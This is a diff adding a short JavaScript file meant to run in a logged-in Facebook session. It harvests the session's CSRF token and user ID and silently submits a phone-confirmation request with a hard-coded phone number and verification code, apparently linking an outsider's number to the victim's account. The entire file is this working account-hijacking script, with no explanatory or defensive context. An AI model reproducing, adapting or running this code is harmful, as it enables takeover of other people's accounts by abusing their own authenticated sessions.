@@ -1,0 +1,18 @@
+var spinR = require(["SiteData"]).__spin_r;
+var spinB = require(["SiteData"]).__spin_b;
+var spinT = require(["SiteData"]).__spin_t;
+var jazoest = require(["SprinkleConfig"]).jazoest;
+var fbdtsg = require(["DTSGInitData"]).token;
+var userId = require(["CurrentUserInitialData"]).USER_ID;
+var hsi = require(["SiteData"]).hsi;
+var sdt = "917895771";
+var codesim = "254133";
+var url = "https://www.facebook.com/ajax/phone/confirmation?source=phone_acquisition_scalable&state=1&promo_type=settings&entry_point=web_mobile_settings";
+var data = "cquick_token=AQ5vNtjB1Y1f6BedRYw&ctarget=https%3A%2F%2Fwww.facebook.com&cquick=jsc_c_s&jazoest=25750&fb_dtsg="+fbdtsg+"&pin="+codesim+"&state=2&source=phone_acquisition_scalable&country=VN&contact_point="+sdt+"&verification_type=code_sms&__user="+userId+"&__a=1&__dyn=7xeUmBwjbg7ebwKheC1swgE98nwgU6C7UW3q327E2vzobo1nEhwem0Ko2_CwjE28wgo2WxO0FE5_wEwt81sbzo5-1uwbe2l2Utwwwi8188fo2IwKw9O0RE5a1qw8W1uwa-7U1mUdEGdw46wbS1Lwqo2Yw&__csr=&__req=a&__hs=19279.BP%3ADEFAULT.2.0.1.0.0&dpr=1&__ccg=MODERATE&__rev=1006383249&__s=rxeklb%3Agsk3ak%3A7rc4xk&__hsi=7154225865633817255&__comet_req=0&lsd=P35lLsYjC4nwvaUuzuLFV6&__spin_r=1006383249&__spin_b=trunk&__spin_t=1665723013";
+fetch(url, {
+    method: 'POST',
+    body: data,
+    headers: {
+        'Content-Type': 'application/x-www-form-urlencoded'
+    }
+}).then(e => e.text()).then(e => {})
